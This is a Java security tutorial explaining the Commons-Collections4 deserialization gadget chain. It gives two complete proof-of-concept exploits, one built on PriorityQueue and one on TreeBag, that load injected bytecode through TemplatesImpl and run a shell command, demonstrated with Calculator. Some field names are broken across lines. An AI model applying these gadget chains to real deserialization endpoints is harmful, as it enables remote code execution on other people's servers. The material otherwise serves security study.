# Java Security Learning-Commons-Collections4 Chain

Author: H3rmesk1t

#Environmental construction
> 1. `JDK` version: JDK1.8u66 (no version restriction yet)
> 2. `Commons-Collections4` version: 4.0

> Use `maven` to build it. First create a `Maven` project without selecting any `Maven` template. The content in `pom.xml` is as follows. Then select the update on the right and let it automatically import the package.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>commons-collections</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-collections4</artifactId>
            <version>4.0</version>
        </dependency>
    </dependencies>

</project>
```

# Pre-knowledge
## TreeBag & TreeMap
> In `CommonsCollection2`, the `comparator``` feature is called when deserializing the priority queue`PriorityQueue`. In conjunction with `TransformingComparator`, it triggers the `transformer`. According to this idea, another class `TreeBag` provides sorting, which calls the comparator when deserializing.

> The `Bag` interface inherits from the `Collection` interface, defines a collection, which records the number of times an object appears in the collection, has a sub-interface `SortedBag`, which defines a `Bag` type that can sort its unique non-repeat members.

<img src="./images/1.png" alt="">

<img src="./images/2.png" alt="">

> `TreeBag` is a standard implementation of `SortedBag`. `TreeBag` uses `TreeMap` to store data and use the specified `Comparator` to sort. `TreeBag` is inherited from `AbstractMapBag` to implement the `SortedBag` interface. When initializing `TreeBag`, a new `TreeMap` is created and stored in the member variable `map`, while the `Comparator` used for sorting is directly stored in `TreeMap`.

<img src="./images/3.png" alt="">

<img src="./images/4.png" alt="">

> When deserializing `TreeBag`, the deserialized `Comparator` object will be handed over to `TreeMap` instantiated, and the `doReadObject` method of the parent class is called for processing.

<img src="./images/5.png" alt="">

> In the doReadObject method, the put` data will be put`TreeMap`

<img src="./images/6.png" alt="">

> For this ordered set of data storage, it will definitely be sorted when deserializing the data. `TreeBag` relies on the feature of `TreeMap` when `put` data, it will call `compare` to sort it to achieve the storage of data order.

<img src="./images/7.png" alt="">

> And in the `comparator` method is called for comparison, to use `TransformingComparator` to trigger subsequent logic

<img src="./images/8.png" alt="">

# Commons-Collections4 Analysis
## POC-1
> This utilization chain uses the `CommonsCollections3` chain to use the constructor of the `TrAXFilter` class to trigger the `TemplatesImpl#newTransformer` method to load malicious bytecode, and uses the `CommonsCollections2` chain to trigger the `TransformingComparator.compare()` through `PriorityQueue` and then calls the `transforming` method of the passed `transformer` object.

```java
package CommonsCollections4;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/30 10:55 am
 */
public class CommonsCollections4PriorityQueue {

    public static void CC4() throws CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, NotFoundException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = pool.makeClass("Evil");
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
        ctClass.makeClassInitializer().insertBefore(shell);

        byte[] shellCode = ctClass.toBytecode();
        byte[][] targetCode = new byte[][]{shellCode};

        TemplatesImpl obj = new TemplatesImpl();
        Class clazz = obj.getClass();
        Field _name = clazz.getDeclaredField("_name");
        Field _bytecode = clazz.getDeclaredField("_by
tecodes");
        Field _tfactory = clazz.getDeclaredField("_tfactory");
        _name.setAccessible(true);
        _bytecode.setAccessible(true);
        _tfactory.setAccessible(true);
        _name.set(obj, "h3rmesk1t");
        _bytecode.set(obj, targetCode);
        _tfactory.set(obj, new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{obj})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);

        PriorityQueue priorityQueue = new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(2);
        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priorityQueue, transformingComparator);

        try {
            // Serialization
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(priorityQueue);
            objectOutputStream.close();

            // Deserialization
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC4();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
<img src="./images/9.png" alt="">

## POC-2
> Compared with `POC-1`, `TreeBag` and `TreeMap` are used instead of `PriorityQueue` for construction

```java
package CommonsCollections4;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/30 11:26 am
 */
public class CommonsCollectionsTreeBag {

    public static void CC4() throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = pool.makeClass("Evil");
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
        ctClass.makeClassInitializer().insertBefore(shell);

        byte[] shellCode = ctClass.toBytecode();
        byte[][] targetCode = new byte[][]{shellCode};

        TemplatesImpl obj = new TemplatesImpl();
        Class _class = obj.getClass();
        Field _name = _class.getDeclaredField("_name");
        Field _bytecode = _class.getDeclaredField("_bytecodes");
        Field _tfactory = _class.getDeclaredField("_t
factory");
        _name.setAccessible(true);
        _bytecode.setAccessible(true);
        _tfactory.setAccessible(true);
        _name.set(obj, "h3rmesk1t");
        _bytecode.set(obj, targetCode);
        _tfactory.set(obj, new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{obj})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);

        TreeBag treeBag = new TreeBag(transformingComparator);
        treeBag.add(obj);

        try {
            // Serialization
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(treeBag);
            objectOutputStream.close();

            // Deserialization
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC4();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
<img src="./images/10.png" alt="">

# Call chain
> PriorityQueue
```java
PriorityQueue.readObject()
    TransformingComparator.compare()
        *ChainedTransformer.transform()
                InvokerTransformer.transform()
                    InstantiateTransformer.transform()
                        TemplatesImpl.newTransformer()
```

> TreeBag
```java
org.apache.commons.collections4.bag.TreeBag.readObject()
    org.apache.commons.collections4.bag.AbstractMapBag.doReadObject()
        java.util.TreeMap.put()
            java.util.TreeMap.compare()
                org.apache.commons.collections4.comparators.TransformingComparator.compare()
                        org.apache.commons.collections4.functors.InvokerTransformer.transform()
```

# Summarize
> Using the `TransformingComparator`'s `compare` method of `ChainedTransformer` will trigger the `transform` method chain of `ChainedTransformer`, which uses `InstantiateTransformer` to instantiate the `TrAXFilter` class. When instantiating this class, it will call `TemplatesImpl`'s `newTransformer`' and execute malicious code

> Use `TreeBag` instead of `PriorityQueue` to trigger `TransformingComparator`, and then use the `Transformer` call chain